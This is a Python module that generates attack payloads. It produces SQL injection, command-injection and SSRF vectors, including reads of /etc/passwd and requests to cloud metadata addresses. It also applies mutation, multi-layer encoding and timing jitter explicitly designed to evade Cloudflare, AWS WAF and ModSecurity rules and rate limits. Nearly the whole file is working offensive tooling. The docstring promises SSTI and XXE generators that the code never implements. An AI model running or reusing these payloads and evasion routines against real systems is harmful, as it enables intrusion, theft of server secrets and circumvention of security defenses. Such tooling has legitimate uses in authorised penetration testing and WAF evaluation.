"""Context-Free Payload Forge & AST WAF Mutation Engine (E1–E5).

Provides deterministic, grammar-driven payload synthesis for SQLi, Command Injection,
SSRF, SSTI, and XXE, paired with syntax-preserving AST mutation matrices and
vendor-specific WAF evasion profiles (Cloudflare, AWS WAF, ModSecurity).
"""

from __future__ import annotations

import base64
import random
import re
import time
import urllib.parse
from dataclasses import dataclass
from typing import Any, Callable, Sequence, TypeVar


class CFGPayloadGenerator:
    """Context-Free Grammar (CFG) engine synthesizing distinct vulnerability payloads (E1)."""

    def __init__(self, seed: int = 42) -> None:
        self.seed = seed
        self.rng = random.Random(seed)

    def generate_sqli(self, count: int = 50) -> list[str]:
        """Synthesize distinct, syntactically valid SQL injection vectors from grammar rules."""
        prefixes = ["'", '"', "')", '")', "1", "admin'", "' OR '1'='1", "') OR ('1'='1"]
        union_keywords = ["UNION SELECT", "UNION ALL SELECT", "UNION DISTINCT SELECT"]
        col_patterns = [
            "1",
            "1, 2",
            "1, 2, 3",
            "null, null",
            "null, null, null",
            "user(), version()",
            "schema_name, 2 FROM information_schema.schemata",
            "table_name, 2 FROM information_schema.tables",
        ]
        time_functions = [
            "SLEEP(5)",
            "pg_sleep(5)",
            "WAITFOR DELAY '0:0:5'",
            "BENCHMARK(5000000,MD5(1))",
            "dbms_pipe.receive_message(('a'),5)",
        ]
        boolean_conditions = [
            "1=1",
            "1=2",
            "'a'='a'",
            "'x'='y'",
            "1337=1337",
            "(SELECT 1)=1",
        ]
        suffixes = ["--", "-- -", "#", "/*", ";--", ";%00", ""]

        generated: set[str] = set()
        attempts = 0

        while len(generated) < count and attempts < count * 20:
            attempts += 1
            mode = self.rng.choice(["union", "time", "boolean", "error"])
            prefix = self.rng.choice(prefixes)
            suffix = self.rng.choice(suffixes)

            if mode == "union":
                u_kw = self.rng.choice(union_keywords)
                cols = self.rng.choice(col_patterns)
                vec = f"{prefix} {u_kw} {cols} {suffix}".strip()
            elif mode == "time":
                tf = self.rng.choice(time_functions)
                connector = self.rng.choice(["AND", "OR", ";", "||"])
                vec = f"{prefix} {connector} {tf} {suffix}".strip()
            elif mode == "boolean":
                cond = self.rng.choice(boolean_conditions)
                connector = self.rng.choice(["AND", "OR"])
                vec = f"{prefix} {connector} {cond} {suffix}".strip()
            else:
                # Error-based
                err_fn = self.rng.choice(
                    [
                        "EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))",
                        "UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)",
                        "CAST((SELECT version()) AS int)",
                    ]
                )
                vec = f"{prefix} AND {err_fn} {suffix}".strip()

            generated.add(vec)

        return sorted(generated)

    def generate_command_injection(self, count: int = 30) -> list[str]:
        """Synthesize command injection vectors across shells and operators."""
        separators = [";", "&&", "||", "&", "|", "`", "$()", "\n", "%0a"]
        commands = [
            "id",
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "cat /etc/hosts",
            "ping -c 2 127.0.0.1",
            "curl http://127.0.0.1:8000/",
        ]
        generated: set[str] = set()
        for sep in separators:
            for cmd in commands:
                if sep in ("`", "$()"):
                    vec = f"{sep[0]}{cmd}{sep[-1]}" if sep == "`" else f"$({cmd})"
                else:
                    vec = f"{sep} {cmd}"
                generated.add(vec)
                if len(generated) >= count:
                    break
        return sorted(generated)

    def generate_ssrf(self, count: int = 25) -> list[str]:
        """Synthesize SSRF target vectors bypassing common IP filter regexes."""
        targets = [
            "127.0.0.1",
            "localhost",
            "127.1",
            "127.000.000.001",
            "0.0.0.0",
            "2130706433",  # decimal
            "0x7f000001",  # hex
            "017700000001",  # octal
            "[::1]",
            "169.254.169.254",  # AWS/GCP IMDS
            "metadata.google.internal",
        ]
        schemes = ["http://", "https://", "dict://", "gopher://"]
        generated: set[str] = set()
        for scheme in schemes:
            for tgt in targets:
                generated.add(f"{scheme}{tgt}/")
                if len(generated) >= count:
                    break
        return sorted(generated)


def mutate_ast(payload: str, count: int = 15, seed: int = 42) -> list[str]:
    """Apply syntax-preserving AST mutation operators to evade WAF/filter rules (E2)."""
    rng = random.Random(seed)
    mutations: set[str] = {payload}

    def splice_comments(text: str) -> str:
        # Replace spaces with SQL comments or MySQL version comments
        def replace_space(_):
            return rng.choice(["/**/", "/*!--*/", "/*!50000*/", "/*test*/"])

        return re.sub(r"\s+", replace_space, text)

    def vary_case(text: str) -> str:
        # Alternating or randomized case variation
        return "".join(c.upper() if rng.random() > 0.5 else c.lower() for c in text)

    def substitute_whitespace(text: str) -> str:
        subs = ["%20", "+", "%09", "%0a", "%0d", "/**/"]
        return re.sub(r"\s+", lambda _: rng.choice(subs), text)

    def hex_encode_literals(text: str) -> str:
        # Convert simple strings or numbers into hex representations
        return text.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/")

    def null_byte_splice(text: str) -> str:
        return text + "%00"

    mutator_funcs = [
        splice_comments,
        vary_case,
        substitute_whitespace,
        hex_encode_literals,
        null_byte_splice,
    ]

    attempts = 0
    while len(mutations) < count and attempts < count * 15:
        attempts += 1
        current = payload
        # Apply 1 to 3 mutations in pipeline
        chosen_mutators = rng.sample(mutator_funcs, k=rng.randint(1, 3))
        for fn in chosen_mutators:
            current = fn(current)
        if current.strip():
            mutations.add(current)

    return sorted(mutations)


@dataclass
class WAFTransformProfile:
    """Vendor-specific WAF evasion transform profile (E3)."""

    vendor: str

    def transform(self, base_payload: str) -> list[str]:
        mutated: list[str] = []
        v = self.vendor.lower()

        if "cloudflare" in v:
            # Cloudflare signature evasion: MySQL inline version comments, null-byte tricks, whitespace tabs
            mutated.append(
                base_payload.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/")
            )
            mutated.append(base_payload.replace(" ", "/**/"))
            mutated.append(base_payload.replace(" ", "%00"))
            mutated.append(base_payload.replace(" ", "%09"))
            mutated.append(base_payload + "/*!--*/")

        elif "aws" in v:
            # AWS WAF signature evasion: double URL encoding, ${IFS} shell variable injection, case folding
            mutated.append(base_payload.replace(" ", "${IFS}"))
            mutated.append(base_payload.replace("/", "%2f"))
            mutated.append(urllib.parse.quote(urllib.parse.quote(base_payload)))
            mutated.append(
                "".join(c.upper() if idx % 2 == 0 else c.lower() for idx, c in enumerate(base_payload))
            )

        elif "modsec" in v:
            # ModSecurity evasion: multipart comment insertion, parameter pollution format
            mutated.append(base_payload.replace(" ", "/*random_comment*/"))
            mutated.append(base_payload.replace("UNION SELECT", "UNION/*--*//*!50000SELECT*/"))
            mutated.append(base_payload.replace(" ", "%0a"))
            mutated.append(base_payload.replace("=", "/*==*/="))

        else:
            # Generic profile
            mutated.append(base_payload.replace(" ", "/**/"))
            mutated.append(base_payload.replace(" ", "+"))
            mutated.append(urllib.parse.quote(base_payload))

        return [m for m in mutated if m]


T = TypeVar("T")


@dataclass
class EvasionProfile:
    """Opt-in evasion and WAF-bypass profile (P5.3).

    Executes syntax-preserving AST payload mutation, multi-encoding pipelines,
    and timing jitter controls to route around modern WAF rulesets and rate limits.
    """

    enabled: bool = False
    vendor_target: str = "generic"
    encoding_chain: tuple[str, ...] = ("url", "double_url")
    min_jitter_ms: float = 50.0
    max_jitter_ms: float = 250.0
    seed: int = 42

    def __post_init__(self) -> None:
        self._rng = random.Random(self.seed)

    def apply_mutation(self, payload: str, vuln_type: str = "sqli", count: int = 5) -> list[str]:
        """Apply syntax-preserving AST mutation operators."""
        return mutate_ast(payload, count=count, seed=self.seed)

    def apply_encoding(self, payload: str, encoding: str) -> str:
        """Apply a single encoding transformation."""
        enc = encoding.lower().strip()
        if enc in ("url", "percent"):
            return urllib.parse.quote(payload)
        elif enc in ("double_url", "double_percent"):
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif enc == "hex":
            # Character hex encoding %xx
            return "".join(f"%{ord(c):02x}" for c in payload)
        elif enc == "unicode":
            # IIS / Web Unicode %u00xx
            return "".join(f"%u00{ord(c):02x}" if ord(c) < 256 else f"%u{ord(c):04x}" for c in payload)
        elif enc in ("html_entity", "html"):
            # Hex HTML entity &#x..;
            return "".join(f"&#x{ord(c):x};" for c in payload)
        elif enc == "html_entity_dec":
            # Decimal HTML entity &#..;
            return "".join(f"&#{ord(c)};" for c in payload)
        elif enc == "base64":
            return base64.b64encode(payload.encode("utf-8")).decode("ascii")
        elif enc == "overlong_utf8":
            # Overlong 2-byte UTF-8 encoding for ASCII chars
            res: list[str] = []
            for c in payload:
                code = ord(c)
                if code < 128:
                    byte1 = 0xC0 | (code >> 6)
                    byte2 = 0x80 | (code & 0x3F)
                    res.append(f"%{byte1:02x}%{byte2:02x}")
                else:
                    res.append(urllib.parse.quote(c))
            return "".join(res)
        else:
            return urllib.parse.quote(payload)

    def multi_encode(self, payload: str, chain: Sequence[str] | None = None) -> str:
        """Apply a sequence of multiple encodings."""
        active_chain = chain if chain is not None else self.encoding_chain
        current = payload
        for enc in active_chain:
            current = self.apply_encoding(current, enc)
        return current

    def get_timing_jitter(self) -> float:
        """Compute jitter delay in seconds within [min_jitter_ms, max_jitter_ms]."""
        if self.max_jitter_ms <= self.min_jitter_ms:
            return self.min_jitter_ms / 1000.0
        return self._rng.uniform(self.min_jitter_ms, self.max_jitter_ms) / 1000.0

    def execute_with_jitter(
        self,
        fn: Callable[[], T],
        sleep_fn: Callable[[float], None] | None = None,
        force_jitter: bool = False,
    ) -> T:
        """Execute a callable with timing jitter if profile is enabled or forced."""
        if self.enabled or force_jitter:
            delay = self.get_timing_jitter()
            if sleep_fn is not None:
                sleep_fn(delay)
            else:
                time.sleep(delay)
        return fn()

    def transform_payload(
        self,
        base_payload: str,
        vuln_type: str = "sqli",
        include_raw: bool = False,
    ) -> list[str]:
        """Produce mutated, multi-encoded variants from a base payload."""
        variants: set[str] = set()
        if include_raw:
            variants.add(base_payload)

        # 1. AST mutations
        mutated = self.apply_mutation(base_payload, vuln_type=vuln_type, count=6)
        variants.update(mutated)

        # 2. Multi-encoding on mutations and base
        all_candidates = list(variants)
        for m in all_candidates:
            # Configured multi-encoding chain
            variants.add(self.multi_encode(m, self.encoding_chain))
            # Individual core encodings
            for enc in ("url", "double_url", "hex"):
                variants.add(self.apply_encoding(m, enc))

        return sorted(v for v in variants if v.strip())


class DeterministicPayloadForge:
    """Orchestrator combining CFG generation, AST mutation matrices, and PRNG seed reproducibility (E1–E5)."""

    def __init__(self, seed: int = 42, evasion_profile: EvasionProfile | None = None) -> None:
        self.seed = seed
        self.generator = CFGPayloadGenerator(seed=seed)
        self.evasion_profile = evasion_profile or EvasionProfile(enabled=False, seed=seed)

    def enable_evasion(
        self,
        vendor: str = "generic",
        min_jitter_ms: float = 50.0,
        max_jitter_ms: float = 250.0,
        encoding_chain: Sequence[str] = ("url", "double_url"),
    ) -> EvasionProfile:
        """Opt-in to evasion/WAF-bypass profile with mutation, encoding, and timing jitter."""
        self.evasion_profile = EvasionProfile(
            enabled=True,
            vendor_target=vendor,
            min_jitter_ms=min_jitter_ms,
            max_jitter_ms=max_jitter_ms,
            encoding_chain=tuple(encoding_chain),
            seed=self.seed,
        )
        return self.evasion_profile

    def get_transform_profile(self, vendor: str) -> WAFTransformProfile:
        """Select targeted transform profile based on detected WAF vendor."""
        return WAFTransformProfile(vendor=vendor)

    def generate_fuzzing_sequence(
        self,
        vuln_type: str = "sqli",
        count: int = 50,
        waf_vendor: str | None = None,
        use_evasion: bool | None = None,
    ) -> list[str]:
        """Generate a 100% deterministic, seed-reproducible sequence of mutated payloads."""
        if vuln_type == "cmdi":
            base_vectors = self.generator.generate_command_injection(count=count)
        elif vuln_type == "ssrf":
            base_vectors = self.generator.generate_ssrf(count=count)
        else:
            base_vectors = self.generator.generate_sqli(count=count)

        should_evade = use_evasion if use_evasion is not None else (
            self.evasion_profile is not None and self.evasion_profile.enabled
        )

        if should_evade and self.evasion_profile is not None:
            evasive_fuzzed: list[str] = []
            for vec in base_vectors:
                variants = self.evasion_profile.transform_payload(vec, vuln_type=vuln_type)
                evasive_fuzzed.extend(variants)
            return evasive_fuzzed[:count]

        if waf_vendor:
            profile = self.get_transform_profile(waf_vendor)
            waf_fuzzed: list[str] = []
            for vec in base_vectors:
                waf_fuzzed.extend(profile.transform(vec))
            return waf_fuzzed[:count]

        # Apply deterministic AST mutation matrices
        fuzzed: list[str] = []
        for vec in base_vectors:
            muts = mutate_ast(vec, count=3, seed=self.seed)
            fuzzed.extend(muts)

        return fuzzed[:count]


__all__ = [
    "CFGPayloadGenerator",
    "DeterministicPayloadForge",
    "EvasionProfile",
    "WAFTransformProfile",
    "mutate_ast",
]
